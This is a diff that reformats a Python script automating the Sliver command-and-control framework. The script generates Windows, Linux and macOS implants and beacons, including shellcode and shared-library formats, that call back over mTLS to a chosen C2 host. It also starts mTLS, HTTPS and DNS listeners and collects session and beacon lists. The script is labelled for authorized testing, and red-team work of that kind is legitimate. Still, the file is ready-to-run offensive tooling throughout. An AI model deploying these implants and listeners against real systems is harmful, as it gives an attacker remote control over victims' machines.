@@ -8,45 +8,120 @@ import logging
 import argparse
 from datetime import datetime
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+logging.basicConfig(
+    level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s"
+)
 logger = logging.getLogger(__name__)
 
 
 def run_sliver_cmd(cmd, sliver_path="sliver-client"):
     """Execute a Sliver client command."""
     try:
-        result = subprocess.run([sliver_path] + cmd, capture_output=True, text=True, timeout=60)
-        return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
+        result = subprocess.run(
+            [sliver_path] + cmd, capture_output=True, text=True, timeout=60
+        )
+        return {
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "returncode": result.returncode,
+        }
     except (FileNotFoundError, subprocess.TimeoutExpired) as e:
         return {"error": str(e)}
 
 
-def generate_implant(name, os_target="windows", arch="amd64", c2_host="", c2_port=443, format_type="exe", sliver_path="sliver-client"):
+def generate_implant(
+    name,
+    os_target="windows",
+    arch="amd64",
+    c2_host="",
+    c2_port=443,
+    format_type="exe",
+    sliver_path="sliver-client",
+):
     """Generate a Sliver implant (beacon or session)."""
-    cmd = ["generate", "--name", name, "--os", os_target, "--arch", arch, "--mtls", f"{c2_host}:{c2_port}"]
+    cmd = [
+        "generate",
+        "--name",
+        name,
+        "--os",
+        os_target,
+        "--arch",
+        arch,
+        "--mtls",
+        f"{c2_host}:{c2_port}",
+    ]
     if format_type == "shellcode":
         cmd.append("--format=shellcode")
     elif format_type == "shared":
         cmd.append("--format=shared-lib")
     result = run_sliver_cmd(cmd, sliver_path)
     logger.info("Generated implant: %s (%s/%s)", name, os_target, arch)
-    return {"implant_name": name, "os": os_target, "arch": arch, "c2": f"{c2_host}:{c2_port}", "result": result}
+    return {
+        "implant_name": name,
+        "os": os_target,
+        "arch": arch,
+        "c2": f"{c2_host}:{c2_port}",
+        "result": result,
+    }
 
 
-def generate_beacon(name, os_target="windows", arch="amd64", c2_host="", c2_port=443, interval="60s", jitter="30", sliver_path="sliver-client"):
+def generate_beacon(
+    name,
+    os_target="windows",
+    arch="amd64",
+    c2_host="",
+    c2_port=443,
+    interval="60s",
+    jitter="30",
+    sliver_path="sliver-client",
+):
     """Generate a Sliver beacon implant."""
-    cmd = ["generate", "beacon", "--name", name, "--os", os_target, "--arch", arch, "--mtls", f"{c2_host}:{c2_port}", "--seconds", interval, "--jitter", jitter]
+    cmd = [
+        "generate",
+        "beacon",
+        "--name",
+        name,
+        "--os",
+        os_target,
+        "--arch",
+        arch,
+        "--mtls",
+        f"{c2_host}:{c2_port}",
+        "--seconds",
+        interval,
+        "--jitter",
+        jitter,
+    ]
     result = run_sliver_cmd(cmd, sliver_path)
-    return {"beacon_name": name, "interval": interval, "jitter": jitter, "result": result}
+    return {
+        "beacon_name": name,
+        "interval": interval,
+        "jitter": jitter,
+        "result": result,
+    }
 
 
-def setup_listeners(c2_host, mtls_port=8888, https_port=443, dns_domain=None, sliver_path="sliver-client"):
+def setup_listeners(
+    c2_host,
+    mtls_port=8888,
+    https_port=443,
+    dns_domain=None,
+    sliver_path="sliver-client",
+):
     """Configure C2 listeners."""
     listeners = []
-    mtls_result = run_sliver_cmd(["mtls", "--lhost", c2_host, "--lport", str(mtls_port)], sliver_path)
-    listeners.append({"type": "mTLS", "host": c2_host, "port": mtls_port, "result": mtls_result})
-    https_result = run_sliver_cmd(["https", "--lhost", c2_host, "--lport", str(https_port)], sliver_path)
-    listeners.append({"type": "HTTPS", "host": c2_host, "port": https_port, "result": https_result})
+    mtls_result = run_sliver_cmd(
+        ["mtls", "--lhost", c2_host, "--lport", str(mtls_port)], sliver_path
+    )
+    listeners.append(
+        {"type": "mTLS", "host": c2_host, "port": mtls_port, "result": mtls_result}
+    )
+    https_result = run_sliver_cmd(
+        ["https", "--lhost", c2_host, "--lport", str(https_port)], sliver_path
+    )
+    listeners.append(
+        {"type": "HTTPS", "host": c2_host, "port": https_port, "result": https_result}
+    )
     if dns_domain:
         dns_result = run_sliver_cmd(["dns", "--domains", dns_domain], sliver_path)
         listeners.append({"type": "DNS", "domain": dns_domain, "result": dns_result})
@@ -78,17 +153,27 @@ def generate_report(listeners, implants, sessions_output, beacons_output):
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Sliver C2 Framework Deployment Agent (Authorized Testing Only)")
+    parser = argparse.ArgumentParser(
+        description="Sliver C2 Framework Deployment Agent (Authorized Testing Only)"
+    )
     parser.add_argument("--c2-host", required=True, help="C2 server IP/hostname")
     parser.add_argument("--implant-name", default="test_implant")
-    parser.add_argument("--os", default="windows", choices=["windows", "linux", "darwin"])
+    parser.add_argument(
+        "--os", default="windows", choices=["windows", "linux", "darwin"]
+    )
     parser.add_argument("--arch", default="amd64", choices=["amd64", "386", "arm64"])
     parser.add_argument("--sliver-path", default="sliver-client")
     parser.add_argument("--output", default="sliver_report.json")
     args = parser.parse_args()
 
     listeners = setup_listeners(args.c2_host, sliver_path=args.sliver_path)
-    implant = generate_implant(args.implant_name, args.os, args.arch, args.c2_host, sliver_path=args.sliver_path)
+    implant = generate_implant(
+        args.implant_name,
+        args.os,
+        args.arch,
+        args.c2_host,
+        sliver_path=args.sliver_path,
+    )
     sessions = list_sessions(args.sliver_path)
     beacons = list_beacons(args.sliver_path)
 
